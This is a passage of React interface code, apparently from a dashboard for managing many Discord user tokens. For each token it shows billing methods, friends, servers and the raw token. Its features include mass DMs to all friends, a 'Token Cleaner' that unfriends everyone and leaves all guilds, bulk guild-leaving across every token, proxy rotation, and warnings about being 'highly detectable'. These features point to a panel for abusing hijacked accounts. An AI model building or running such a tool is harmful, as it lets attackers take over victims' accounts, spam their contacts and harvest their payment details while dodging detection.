                 <span className="flex gap-2 items-center text-red-400 font-medium"><Trash2 className="w-4 h-4" /> Token Cleaner</span> 
              </div>
              <div className="px-3 py-1.5 hover:bg-red-900/40 cursor-pointer flex justify-between group" onClick={(e) => { 
                 e.stopPropagation(); 
                 setContextMenu(null); 
                 setShowBlacklistGui(true);
              }}>
                 <span className="flex gap-2 items-center text-red-400 font-medium"><LogOut className="w-4 h-4" /> Global Blacklister</span> 
              </div>
            </>
          )}

          {contextView === 'theme' && (
            <>
              <div className="px-3 py-1 text-[10px] text-gray-500 font-semibold tracking-wider mb-1 border-b border-gray-700 pb-2 flex items-center gap-2 cursor-pointer hover:text-white" onClick={() => setContextView('main')}>&lt; Back</div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex justify-between" onClick={() => handleAction(contextMenu.accountId, 'theme', 'dark')}>Dark Mode</div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex justify-between" onClick={() => handleAction(contextMenu.accountId, 'theme', 'light')}>Light Mode</div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex justify-between" onClick={() => handleAction(contextMenu.accountId, 'theme', 'midnight')}>Midnight</div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex justify-between" onClick={() => handleAction(contextMenu.accountId, 'theme', 'darker')}>Onyx</div>
            </>
          )}

          {contextView === 'language' && (
            <div className="flex flex-col h-full overflow-hidden">
              <div className="px-3 py-1 text-[10px] text-gray-500 font-semibold tracking-wider mb-1 border-b border-gray-700 pb-2 flex items-center gap-2 cursor-pointer hover:text-white shrink-0" onClick={() => setContextView('main')}>&lt; Back</div>
              <div className="overflow-y-auto custom-scrollbar" style={{maxHeight: '300px'}}>
                {[ 
                  { l: "en-US", n: "English (US)" }, { l: "en-GB", n: "English (UK)" }, { l: "zh-CN", n: "Chinese" }, 
                  { l: "zh-TW", n: "Traditional Chinese" }, { l: "cs", n: "Czech" }, { l: "da", n: "Danish" }, 
                  { l: "nl", n: "Dutch" }, { l: "fr", n: "French" }, { l: "de", n: "German" }, 
                  { l: "el", n: "Greek" }, { l: "hi", n: "Hindi" }, { l: "hu", n: "Hungarian" }, 
                  { l: "it", n: "Italian" }, { l: "ja", n: "Japanese" }, { l: "ko", n: "Korean" }, 
                  { l: "pl", n: "Polish" }, { l: "pt-BR", n: "Portuguese (BR)" }, { l: "ro", n: "Romanian" }, 
                  { l: "ru", n: "Russian" }, { l: "es-ES", n: "Spanish" }, { l: "sv-SE", n: "Swedish" }, 
                  { l: "th", n: "Thai" }, { l: "tr", n: "Turkish" }, { l: "uk", n: "Ukrainian" }, { l: "vi", n: "Vietnamese" }
                ].map(lang => (
                  <div key={lang.l} className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer" onClick={() => handleAction(contextMenu.accountId, 'language', lang.l)}>
                     <span className="text-gray-300 hover:text-white text-sm">{lang.n}</span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {activeWindows.map(win => (
        <Rnd
          key={win.id}
          default={{ x: window.innerWidth / 2 - 250, y: window.innerHeight / 2 - 300, width: 480, height: 600 }}
          minWidth={400}
          minHeight={400}
          bounds="window"
          dragHandleClassName="draggable-header"
          onMouseDown={() => bringToFront(win.id)}
          style={{ zIndex: win.zIndex }}
          className="bg-gray-900 border border-gray-700 shadow-2xl rounded-xl overflow-auto flex flex-col"
        >
          <div className="draggable-header bg-gray-800 px-4 py-3 flex justify-between items-center cursor-move border-b border-gray-700 select-none">
            <div className="flex items-center gap-3">
              <img src={win.data.avatar ? `https://cdn.discordapp.com/avatars/${win.data.id}/${win.data.avatar}.png` : 'https://cdn.discordapp.com/embed/avatars/0.png'} className="w-8 h-8 rounded-full drag-none" alt="" />
              <div className="flex flex-col">
                  <span className="font-semibold text-sm tracking-wide flex items-center gap-2">{win.data.username} {win.data.valid ? (
                    <span className="bg-green-900/50 text-green-400 border border-green-800 px-1.5 py-0.5 rounded text-[9px] uppercase font-bold flex items-center justify-center"><CheckCircle className="w-2.5 h-2.5" /></span>
                  ) : (
                    <span className="bg-red-900/50 text-red-400 border border-red-800 px-1.5 py-0.5 rounded text-[9px] uppercase font-bold flex items-center justify-center"><AlertOctagon className="w-2.5 h-2.5" /></span>
                  )}</span>
                  <div className="flex gap-2 mt-1 items-center">
                      <button title="Set Online" onClick={(e) => {e.stopPropagation(); handleAction(win.id, 'status', 'online');}} className="w-2.5 h-2.5 rounded-full bg-green-500 hover:scale-125 transition-transform"></button>
                      <button title="Set Idle" onClick={(e) => {e.stopPropagation(); handleAction(win.id, 'status', 'idle');}} className="w-2.5 h-2.5 rounded-full bg-yellow-500 hover:scale-125 transition-transform"></button>
                      <button title="Set DND" onClick={(e) => {e.stopPropagation(); handleAction(win.id, 'status', 'dnd');}} className="w-2.5 h-2.5 rounded-full bg-red-500 hover:scale-125 transition-transform"></button>
                      <button title="Set Invisible" onClick={(e) => {e.stopPropagation(); handleAction(win.id, 'status', 'invisible');}} className="w-2.5 h-2.5 rounded-full border border-gray-500 hover:scale-125 transition-transform cursor-pointer"></button>
                  </div>
              </div>
            </div>
            <div className="flex gap-2 items-center">
              <button onMouseDown={(e) => { e.stopPropagation(); refreshAccount(win.id); }} className="text-gray-400 hover:text-indigo-400"><RefreshCw className="w-4 h-4" /></button>
              <button onMouseDown={(e) => { e.stopPropagation(); closeWindow(win.id); }} className="text-gray-400 hover:text-red-400 rounded-full hover:bg-gray-700 p-1"><X className="w-4 h-4" /></button>
            </div>
          </div>

          <div className="flex-1 overflow-y-auto p-4 custom-scrollbar bg-gray-900 text-sm">
            
            <div className="mb-6">
              <h4 className="text-xs uppercase tracking-wider text-gray-500 font-semibold mb-3 flex items-center gap-2">
                <CreditCard className="w-4 h-4" /> Billing
              </h4>
              {win.data.billing && win.data.billing.length > 0 ? (
                <div className="flex flex-col gap-2">
                  {win.data.billing.map((b, i) => (
                    <div key={i} className="flex items-center gap-3 bg-gray-800 p-3 rounded-lg border border-gray-700">
                      {b.type === 1 ? (
                        <svg className="w-8 h-8 text-indigo-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="5" width="18" height="14" rx="2" ry="2"></rect><line x1="3" y1="10" x2="21" y2="10"></line></svg>
                      ) : (
                        <svg className="w-8 h-8 text-blue-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"></path><path d="M8 12h8"></path><path d="M12 8v8"></path></svg>
                      )}
                      <div>
                        <div className="font-semibold">{b.type === 1 ? 'Credit Card' : 'PayPal'}</div>
                        <div className="text-xs text-gray-400">Brand: {b.brand} {b.invalid && <span className="text-red-400">(Invalid)</span>}</div>
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-gray-500 italic bg-gray-800/50 p-3 rounded text-sm border border-gray-800">No billing methods attached.</div>
              )}
            </div>

            <div>
              <h4 className="text-xs uppercase tracking-wider text-gray-500 font-semibold mb-3 flex items-center gap-2">
                <Users className="w-4 h-4" /> Relationship Data ({win.data.friends?.length || 0} Friends)
              </h4>
              <textarea 
                readOnly
                className="w-full bg-gray-800 border border-gray-700 rounded-lg p-3 text-xs font-mono text-gray-400 h-32 focus:outline-none focus:border-indigo-500 custom-scrollbar resize-none"
                value={win.data.friends ? win.data.friends.map(f => `${f.username} | ${f.id}`).join('\n') : ''}
              />
            </div>

            <div>
              <h4 className="text-xs uppercase tracking-wider text-gray-500 font-semibold mb-3 flex items-center gap-2 mt-4">
                <Server className="w-4 h-4" /> Guilds Data ({win.data.guilds?.length || 0})
              </h4>
              <textarea 
                readOnly
                className="w-full bg-gray-800 border border-gray-700 rounded-lg p-3 text-xs font-mono text-gray-400 h-24 focus:outline-none focus:border-indigo-500 custom-scrollbar resize-none"
                value={win.data.guilds ? win.data.guilds.map(g => `${g.id} | ${g.name}`).join('\n') : ''}
              />
            </div>

            <div>
              <h4 className="text-xs uppercase tracking-wider text-gray-500 font-semibold mb-3 flex items-center gap-2 mt-4 text-pink-400">
                <Server className="w-4 h-4" /> Owned Guilds ({win.data.guilds?.filter(g => g.owner).length || 0})
              </h4>
              <textarea 
                readOnly
                className="w-full bg-gray-800 border-pink-900/50 rounded-lg p-3 text-xs font-mono text-pink-200/70 h-24 focus:outline-none custom-scrollbar resize-none"
                value={win.data.guilds ? win.data.guilds.filter(g => g.owner).map(g => `${g.member_count} Members | ${g.id} | ${g.name}`).join('\n') : ''}
              />
            </div>

            <div className="mt-4 pt-4 border-t border-gray-800">
                <h4 className="text-xs uppercase tracking-wider text-gray-500 font-semibold mb-2">Token Value</h4>
                <div className="bg-gray-950 border border-gray-800 p-2 rounded text-[10px] font-mono break-all text-indigo-400/70 select-all">{win.data.token}</div>
            </div>

          </div>
        </Rnd>
      ))}

      {showBlacklistGui && (
        <Rnd
          default={{ x: window.innerWidth / 2 - 250, y: window.innerHeight / 2 - 200, width: 500, height: 400 }}
          minWidth={400}
          minHeight={300}
          bounds="window"
          dragHandleClassName="blacklist-drag"
          style={{ zIndex: 9999 }}
          className="bg-gray-900 border border-red-600/50 shadow-2xl rounded-xl overflow-auto flex flex-col"
        >
          <div className="blacklist-drag bg-gray-800 px-4 py-3 flex justify-between items-center cursor-move border-b border-gray-700 select-none">
            <div className="flex items-center gap-3 text-red-500 font-bold">
              <LogOut className="w-5 h-5" /> Global Guild Blacklister
            </div>
            <button onMouseDown={() => setShowBlacklistGui(false)} className="text-gray-400 hover:text-red-400"><X className="w-4 h-4" /></button>
          </div>
          <div className="p-4 border-b border-gray-700 bg-gray-800 flex flex-col gap-3">
             <div className="text-xs text-gray-400">Target IDs placed here will be tracked globally. You can manually run the Blacklister across all tokens to mass-leave them. Use commas to add multiple IDs.</div>
             <div className="flex gap-2">
                 <input type="text" placeholder="Guild ID to blacklist..." className="flex-1 bg-gray-900 border border-gray-700 rounded px-3 py-2 text-sm focus:outline-none focus:border-red-500 text-gray-300" value={newBlacklistId} onChange={e => setNewBlacklistId(e.target.value)} />
                 <button onClick={addToBlacklist} className="px-4 py-2 bg-red-600 hover:bg-red-500 text-white rounded text-sm font-semibold shadow-lg shadow-red-600/20">Add</button>
                 <button onClick={runGlobalBlacklister} className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white rounded text-sm font-semibold shadow-lg shadow-indigo-600/20 flex items-center gap-2"><LogOut className="w-4 h-4"/> Execute All</button>
             </div>
          </div>
          <div className="flex-1 overflow-y-auto p-4 custom-scrollbar bg-gray-900 text-sm">
             {blacklistedGuilds.length > 0 ? (
                <div className="grid grid-cols-1 gap-2">
                  {blacklistedGuilds.map(id => (
                    <div key={id} className="bg-gray-800 border border-gray-700 p-3 rounded-lg flex items-center justify-between group hover:border-red-500 transition-colors">
                       <div className="font-mono text-gray-300">{id}</div>
                       <button onClick={() => removeFromBlacklist(id)} className="px-3 py-1 bg-gray-700 hover:bg-red-600 text-gray-300 hover:text-white rounded text-xs transition border border-gray-600 hover:border-red-700"><Trash2 className="w-3 h-3"/></button>
                    </div>
                  ))}
                </div>
             ) : (
                <div className="text-gray-500 italic text-center mt-6">No blacklisted guilds.</div>
             )}
          </div>
        </Rnd>
      )}

      {showProxiesGui && (
        <Rnd
          default={{ x: window.innerWidth / 2 - 300, y: window.innerHeight / 2 - 250, width: 600, height: 500 }}
          minWidth={400}
          minHeight={300}
          bounds="window"
          dragHandleClassName="proxies-drag"
          style={{ zIndex: 9999 }}
          className="bg-gray-900 border border-blue-600/50 shadow-2xl rounded-xl overflow-auto flex flex-col"
        >
          <div className="proxies-drag bg-gray-800 px-4 py-3 flex justify-between items-center cursor-move border-b border-gray-700 select-none">
            <div className="flex items-center gap-3 text-blue-400 font-bold">
              <Activity className="w-5 h-5" /> Proxy Manager
            </div>
            <button onMouseDown={() => setShowProxiesGui(false)} className="text-gray-400 hover:text-red-400"><X className="w-4 h-4" /></button>
          </div>
          <div className="p-4 border-b border-gray-700 bg-gray-800 flex flex-col gap-3">
             <div className="text-xs text-gray-400">Add SOCKS5 or HTTP proxies to rotate when making heavy requests. You can bulk paste formatted proxies here (e.g. <span className="text-gray-300 font-mono">ip:port:user:pass</span>).</div>
             <div>
                 <textarea 
                    placeholder="127.0.0.1:8080&#10;192.168.1.1:8080:user:pass" 
                    className="w-full bg-gray-900 border border-gray-700 rounded px-3 py-2 text-xs font-mono focus:outline-none focus:border-blue-500 text-gray-300 h-24 custom-scrollbar resize-none" 
                    value={newProxiesRaw} 
                    onChange={e => setNewProxiesRaw(e.target.value)} 
                 />
                 <div className="flex mt-2 gap-2 justify-end">
                     <button onClick={() => {
                         if(!newProxiesRaw.trim()) return;
                         const lines = newProxiesRaw.split('\n').map(l=>l.trim()).filter(l=>l);
                         const newList = [...new Set([...proxiesList, ...lines])];
                         setProxiesList(newList);
                         localStorage.setItem('discord_proxies', JSON.stringify(newList));
                         setNewProxiesRaw('');
                         setToast({type: 'success', msg: `Added ${lines.length} proxies.`});
                         setTimeout(() => setToast(null), 3000);
                     }} className="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded text-sm font-semibold shadow-lg shadow-blue-600/20">Add Proxies</button>
                     <button onClick={() => {
                         setProxiesList([]);
                         localStorage.setItem('discord_proxies', '[]');
                         setToast({type: 'success', msg: 'Cleared all proxies.'});
                         setTimeout(() => setToast(null), 3000);
                     }} className="px-4 py-2 bg-red-900/40 hover:bg-red-900/60 border border-red-800 text-red-200 rounded text-sm font-medium">Clear All</button>
                 </div>
             </div>
          </div>
          <div className="flex-1 overflow-y-auto p-4 custom-scrollbar bg-gray-900 text-sm">
             <div className="mb-2 flex justify-between text-xs text-gray-500 uppercase tracking-wider font-semibold">
                 <span>Active Proxies ({proxiesList.length})</span>
                 <span className={proxyMode ? "text-green-400" : "text-yellow-500"}>{proxyMode ? 'Routing Enabled' : 'Routing Disabled'}</span>
             </div>
             {proxiesList.length > 0 ? (
                <div className="grid grid-cols-1 gap-2">
                  {proxiesList.map((p, i) => (
                    <div key={i} className="bg-gray-800 border border-gray-700 p-2 rounded-lg flex items-center justify-between group hover:border-blue-500 transition-colors">
                       <div className="font-mono text-gray-300 text-xs truncate max-w-[80%]">{p}</div>
                       <button onClick={() => {
                           const n = proxiesList.filter((_, idx) => idx !== i);
                           setProxiesList(n);
                           localStorage.setItem('discord_proxies', JSON.stringify(n));
                       }} className="px-2 py-1 bg-gray-700 hover:bg-red-600 text-gray-300 hover:text-white rounded text-xs transition border border-gray-600 hover:border-red-700"><Trash2 className="w-3 h-3"/></button>
                    </div>
                  ))}
                </div>
             ) : (
                <div className="text-gray-500 italic text-center mt-6">No proxies loaded.</div>
             )}
          </div>
        </Rnd>
      )}

      {showSettings && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center">
          <div className="bg-gray-900 border border-gray-700 rounded-xl w-[400px] shadow-2xl p-6 relative">
            <button onClick={() => setShowSettings(false)} className="absolute top-4 right-4 text-gray-400 hover:text-white"><X className="w-5 h-5"/></button>
            <h3 className="text-xl font-bold mb-4 flex items-center gap-2"><Settings className="text-indigo-500" /> Dashboard Config</h3>
            <div className="mb-4">
              <label className="text-[10px] text-gray-400 uppercase font-semibold block mb-1">Actions Webhook URL</label>
              <input 
                type="text" 
                className="w-full bg-gray-800 border border-gray-700 focus:border-indigo-500 rounded px-3 py-2 text-gray-300 font-mono text-xs outline-none"
                placeholder="https://discord.com/api/webhooks/..."
                value={webhookUrl}
                onChange={e => setWebhookUrl(e.target.value)}
              />
            </div>
            <div className="mb-6">
              <label className="text-[10px] text-gray-400 uppercase font-semibold block mb-1">Auto-Refresh Interval (Mins)</label>
              <select 
                value={autoRefreshInterval} 
                onChange={e => setAutoRefreshInterval(e.target.value)}
                className="w-full bg-gray-800 border border-gray-700 rounded px-3 py-2 text-sm text-gray-300 focus:outline-none focus:border-indigo-500"
              >
                  <option value="0">Off (Manual Only)</option>
                  <option value="1">1 Minute</option>
                  <option value="3">3 Minutes</option>
                  <option value="5">5 Minutes</option>
                  <option value="10">10 Minutes</option>
              </select>
            </div>
            <div className="mb-6 flex items-center justify-between">
              <div>
                 <label className="text-[10px] text-gray-400 uppercase font-semibold block">Proxy Mode</label>
                 <div className="text-[10px] text-gray-500">Route all actions through proxies.</div>
              </div>
              <label className="relative inline-flex items-center cursor-pointer">
                <input type="checkbox" className="sr-only peer" checked={proxyMode} onChange={e => setProxyMode(e.target.checked)} />
                <div className="w-9 h-5 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-indigo-500"></div>
              </label>
            </div>
            <div className="flex justify-end gap-3">
              <button onClick={() => setShowSettings(false)} className="px-4 py-2 bg-gray-800 hover:bg-gray-700 rounded text-sm font-medium">Cancel</button>
              <button onClick={() => {
                  localStorage.setItem('discord_webhook', webhookUrl);
                  localStorage.setItem('auto_refresh_mins', autoRefreshInterval);
                  localStorage.setItem('proxy_mode', proxyMode.toString());
                  setShowSettings(false);
                  logToWebhook('Settings Updated', `Dashboard settings saved.\n\nAuto-refresh: ${autoRefreshInterval > 0 ? autoRefreshInterval + ' mins' : 'Off'}\nProxy Mode: ${proxyMode ? 'Enabled' : 'Disabled'}`, 3447003);
                  setToast({type: 'success', msg: 'Settings Saved'});
                  setTimeout(() => setToast(null), 3000);
              }} className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 rounded text-sm font-medium shadow-lg shadow-indigo-600/30">Save Settings</button>
            </div>
          </div>
        </div>
      )}

      {showAddModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center">
          <div className="bg-gray-900 border border-gray-700 rounded-xl w-[400px] shadow-2xl p-6 relative">
            <button onClick={() => setShowAddModal(false)} className="absolute top-4 right-4 text-gray-400 hover:text-white"><X className="w-5 h-5"/></button>
            <h3 className="text-xl font-bold mb-4 flex items-center gap-2"><Key className="text-indigo-500" /> Add token</h3>
            <p className="text-gray-400 text-sm mb-4">Enter the discord token to analyze data for.</p>
            <textarea 
              autoFocus
              className="w-full h-32 bg-gray-800 border-2 border-gray-700 focus:border-indigo-500 rounded-lg p-3 text-gray-300 font-mono text-sm resize-none outline-none mb-4 custom-scrollbar"
              placeholder="ODU1MDYy...................."
              value={newToken}
              onChange={e => setNewToken(e.target.value)}
            />
            <div className="flex justify-end gap-3">
              <button onClick={() => setShowAddModal(false)} className="px-4 py-2 bg-gray-800 hover:bg-gray-700 rounded text-sm font-medium">Cancel</button>
              <button onClick={addAccount} className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 rounded text-sm font-medium shadow-lg shadow-indigo-600/30">Save</button>
            </div>
          </div>
        </div>
      )}

      {rmWindow && (
        <Rnd
          default={{ x: window.innerWidth / 2 - 300, y: window.innerHeight / 2 - 250, width: 600, height: 500 }}
          minWidth={500}
          minHeight={400}
          bounds="window"
          dragHandleClassName="rm-drag"
          style={{ zIndex: 999 }}
          className="bg-gray-900 border border-gray-700 shadow-2xl rounded-xl overflow-auto flex flex-col"
        >
          <div className="rm-drag bg-gray-800 px-4 py-3 flex justify-between items-center cursor-move border-b border-gray-700 select-none">
            <div className="flex items-center gap-3 text-indigo-400 font-bold">
              <Users className="w-5 h-5" /> Relationship Manager ({rmWindow.username})
            </div>
            <button onMouseDown={() => setRmWindow(null)} className="text-gray-400 hover:text-red-400"><X className="w-4 h-4" /></button>
          </div>
          <div className="flex-1 overflow-y-auto p-4 custom-scrollbar bg-gray-900 text-sm">
             <div className="mb-4 flex flex-col gap-2">
                 <div className="flex bg-gray-800 border border-gray-700 rounded-lg overflow-hidden">
                     <input type="text" placeholder="Message to all friends..." className="flex-1 bg-transparent px-3 py-2 text-sm focus:outline-none text-gray-300" id={`dmall-${rmWindow.id}`} />
                     <button onClick={() => {
                         const msg = document.getElementById(`dmall-${rmWindow.id}`).value;
                         if(msg) { setDmAllMessage(msg); setContextAccount(rmWindow); setShowDmWarning(true); }
                     }} className="px-4 py-2 bg-red-900/40 hover:bg-red-600 text-red-200 text-xs font-semibold flex items-center gap-2 border-l border-gray-700 transition"><AlertOctagon className="w-4 h-4"/> Mass DM</button>
                 </div>
                 <div className="flex items-center bg-gray-800 border border-gray-700 rounded-lg px-3 py-2">
                     <Search className="w-4 h-4 text-gray-500 mr-2" />
                     <input type="text" placeholder="Find friends..." className="bg-transparent border-none outline-none text-gray-300 w-full text-xs" value={friendSearch} onChange={e => setFriendSearch(e.target.value)} />
                 </div>
             </div>
             {rmWindow.friends && rmWindow.friends.length > 0 ? (
                <div className="grid grid-cols-1 gap-2">
                  {rmWindow.friends.filter(f => f.username.toLowerCase().includes(friendSearch.toLowerCase()) || f.id.includes(friendSearch)).map(f => (
                    <div key={f.id} className="bg-gray-800 border border-gray-700 p-3 rounded-lg flex flex-col gap-3 group hover:border-indigo-500 transition-colors">
                      <div className="flex items-center justify-between">
                         <div className="flex items-center gap-3">
                            <img src={f.avatar ? `https://cdn.discordapp.com/avatars/${f.id}/${f.avatar}.png` : 'https://cdn.discordapp.com/embed/avatars/0.png'} className="w-8 h-8 rounded-full" />
                            <div>
                               <div className="font-bold text-gray-200">{f.username}</div>
                               <div className="text-xs text-gray-500 font-mono">{f.id}</div>
                            </div>
                         </div>
                         <div className="flex gap-2">
                            <span className={`text-[10px] px-2 py-1 rounded font-bold uppercase ${f.type === 'Friend' ? 'bg-green-900/50 text-green-400' : f.type === 'Blocked' ? 'bg-red-900/50 text-red-400' : 'bg-yellow-900/50 text-yellow-500'}`}>{f.type}</span>
                            <button onClick={() => blockUser(rmWindow.id, f.id)} className="px-3 py-1 bg-red-900/40 hover:bg-red-600 text-red-200 rounded text-xs transition border border-red-800">Block</button>
                         </div>
                      </div>
                      <div className="flex gap-2">
                         <input type="text" id={`dm-${f.id}`} placeholder="Message payload..." className="flex-1 bg-gray-900 border border-gray-700 rounded px-2 text-xs focus:outline-none focus:border-indigo-500 text-gray-300" />
                         <button onClick={() => {
                             const el = document.getElementById(`dm-${f.id}`);
                             if(el.value) dispatchDm(rmWindow.id, f.id, el.value);
                         }} className="px-3 py-1 bg-indigo-600 hover:bg-indigo-500 text-white rounded text-xs font-semibold shadow-lg shadow-indigo-600/20">Send DM</button>
                      </div>
                    </div>
                  ))}
                </div>
             ) : (
                <div className="text-gray-500 italic text-center mt-10">No relational targets extracted yet.</div>
             )}
          </div>
        </Rnd>
      )}

      {gmWindow && (
        <Rnd
          default={{ x: window.innerWidth / 2 - 300, y: window.innerHeight / 2 - 250, width: 600, height: 500 }}
          minWidth={500}
          minHeight={400}
          bounds="window"
          dragHandleClassName="gm-drag"
          style={{ zIndex: 999 }}
          className="bg-gray-900 border border-gray-700 shadow-2xl rounded-xl overflow-auto flex flex-col"
        >
          <div className="gm-drag bg-gray-800 px-4 py-3 flex justify-between items-center cursor-move border-b border-gray-700 select-none">
            <div className="flex items-center gap-3 text-indigo-400 font-bold">
              <Server className="w-5 h-5" /> Guild Manager ({gmWindow.username})
            </div>
            <button onMouseDown={() => setGmWindow(null)} className="text-gray-400 hover:text-red-400"><X className="w-4 h-4" /></button>
          </div>
          <div className="p-4 border-b border-gray-700 bg-gray-800 flex gap-2">
             <input type="text" placeholder="Invite link (e.g. discord.gg/abc)" className="flex-1 bg-gray-900 border border-gray-700 rounded px-3 py-2 text-sm focus:outline-none focus:border-indigo-500 text-gray-300" value={guildInvite} onChange={e => setGuildInvite(e.target.value)} />
             <button onClick={() => joinGuild(gmWindow.id)} className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white rounded text-sm font-semibold shadow-lg shadow-indigo-600/20 flex items-center gap-2"><Link className="w-4 h-4"/> Join</button>
          </div>
          <div className="flex-1 overflow-y-auto p-4 custom-scrollbar bg-gray-900 text-sm">
             {gmWindow.guilds && gmWindow.guilds.length > 0 ? (
                <div className="grid grid-cols-1 gap-2">
                  {gmWindow.guilds.map(g => (
                    <div key={g.id} className="bg-gray-800 border border-gray-700 p-3 rounded-lg flex flex-col gap-3 group hover:border-indigo-500 transition-colors">
                      <div className="flex items-center justify-between">
                         <div className="flex items-center gap-3 w-3/4">
                            <img src={g.icon ? `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png` : 'https://cdn.discordapp.com/embed/avatars/0.png'} className="w-8 h-8 rounded-full" />
                            <div className="truncate">
                               <div className="font-bold text-gray-200 truncate">{g.name}</div>
                               <div className="text-xs text-gray-500 font-mono">{g.id} {g.owner && <span className="ml-2 text-pink-400 uppercase text-[10px] font-bold">Owner</span>}</div>
                            </div>
                         </div>
                         <div className="flex gap-2">
                            <button onClick={() => leaveGuild(gmWindow.id, g.id)} className="px-3 py-1 bg-red-900/40 hover:bg-red-600 text-red-200 rounded text-xs transition border border-red-800 flex items-center gap-1"><LogOut className="w-3 h-3"/> Leave</button>
                         </div>
                      </div>
                    </div>
                  ))}
                </div>
             ) : (
                <div className="text-gray-500 italic text-center mt-10">No guilds extracted yet.</div>
             )}
          </div>
        </Rnd>
      )}

      {pcWindow && (
        <Rnd
          default={{ x: window.innerWidth / 2 - 200, y: window.innerHeight / 2 - 200, width: 400, height: 420 }}
          minWidth={300}
          minHeight={350}
          bounds="window"
          dragHandleClassName="pc-drag"
          style={{ zIndex: 999 }}
          className="bg-gray-900 border border-gray-700 shadow-2xl rounded-xl overflow-auto flex flex-col"
        >
          <div className="pc-drag bg-gray-800 px-4 py-3 flex justify-between items-center cursor-move border-b border-gray-700 select-none">
            <div className="flex items-center gap-3 text-indigo-400 font-bold">
              <Settings className="w-5 h-5" /> Profile Manager ({pcWindow.username})
            </div>
            <button onMouseDown={() => setPcWindow(null)} className="text-gray-400 hover:text-red-400"><X className="w-4 h-4" /></button>
          </div>
          <div className="flex-1 overflow-y-auto p-4 custom-scrollbar bg-gray-900 text-sm">
             <div className="mb-4">
                 <label className="text-[10px] text-gray-400 uppercase font-semibold mb-1 block">Display Name</label>
                 <input type="text" id={`dn-${pcWindow.id}`} placeholder={pcWindow.username} defaultValue={pcWindow.global_name || ""} className="w-full bg-gray-800 border-2 border-gray-700 rounded px-2 py-1.5 focus:outline-none focus:border-indigo-500 text-gray-300 text-xs mb-3" />
                 <label className="text-[10px] text-gray-400 uppercase font-semibold mb-1 block">Bio</label>
                 <textarea id={`bio-${pcWindow.id}`} className="w-full bg-gray-800 border-2 border-gray-700 rounded px-2 py-1.5 h-16 focus:outline-none focus:border-indigo-500 text-gray-300 text-xs resize-none mb-3" placeholder="About Me..." />
                 <button onClick={() => {
                     const dn = document.getElementById(`dn-${pcWindow.id}`).value;
                     const bio = document.getElementById(`bio-${pcWindow.id}`).value;
                     saveProfile(pcWindow.id, {global_name: dn, bio});
                 }} className="w-full py-1.5 bg-indigo-600 hover:bg-indigo-500 text-white rounded text-xs font-semibold shadow-lg shadow-indigo-600/30">Save Profile</button>
             </div>
             
             <div className="mt-4 border-t border-gray-800 pt-3">
                 <h4 className="text-[10px] text-gray-400 font-bold uppercase tracking-wider mb-2">HypeSquad House</h4>
                 <div className="grid grid-cols-3 gap-2">
                     <button onClick={() => saveHypeSquad(pcWindow.id, 1)} className="bg-[#9b59b6]/20 border border-[#9b59b6] text-[#9b59b6] py-1 rounded text-[10px] font-bold hover:bg-[#9b59b6]/40 transition">Bravery</button>
                     <button onClick={() => saveHypeSquad(pcWindow.id, 2)} className="bg-[#f1c40f]/20 border border-[#f1c40f] text-[#f1c40f] py-1 rounded text-[10px] font-bold hover:bg-[#f1c40f]/40 transition">Brilliance</button>
                     <button onClick={() => saveHypeSquad(pcWindow.id, 3)} className="bg-[#1abc9c]/20 border border-[#1abc9c] text-[#1abc9c] py-1 rounded text-[10px] font-bold hover:bg-[#1abc9c]/40 transition">Balance</button>
                 </div>
             </div>
          </div>
        </Rnd>
      )}

      {cleanerWarning && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm z-[9999] flex items-center justify-center">
          <div className="bg-gray-900 border border-red-600 rounded-xl w-[400px] shadow-2xl p-6 relative">
            <h3 className="text-xl font-bold mb-4 flex items-center gap-2 text-red-500"><AlertOctagon /> Token Cleaner</h3>
            <p className="text-gray-300 text-sm mb-6">
              This action will <strong>unfriend everyone, close every DM, and leave all guilds</strong>. It is irreversible and highly detectable. Are you sure?
            </p>
            <div className="flex justify-end gap-3">
              <button onClick={() => setCleanerWarning(false)} className="px-4 py-2 bg-gray-800 hover:bg-gray-700 rounded text-sm font-medium">Cancel</button>
              <button onClick={startTokenCleaner} className="px-4 py-2 bg-red-600 hover:bg-red-500 rounded text-sm font-medium shadow-lg shadow-red-600/30 text-white">Wipe Token</button>
            </div>
          </div>
        </div>
      )}

      {showDmWarning && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm z-[9999] flex items-center justify-center">
          <div className="bg-gray-900 border border-red-600 rounded-xl w-[400px] shadow-2xl p-6 relative">
            <h3 className="text-xl font-bold mb-4 flex items-center gap-2 text-red-500"><AlertOctagon /> Danger Zone</h3>
            <p className="text-gray-300 text-sm mb-4">
              Sending a mass DM to all friends is highly detectable and <strong>can get your account limited or banned on Discord</strong>. Are you absolutely sure you want to proceed?
            </p>
            <div className="mb-6">
                <input type="text" placeholder="Message to DM EVERYONE..." className="w-full bg-gray-800 border border-red-900/50 rounded px-3 py-2 text-sm focus:outline-none focus:border-red-500 text-gray-300" value={dmAllMessage} onChange={e => setDmAllMessage(e.target.value)} />
            </div>
            <div className="flex justify-end gap-3">
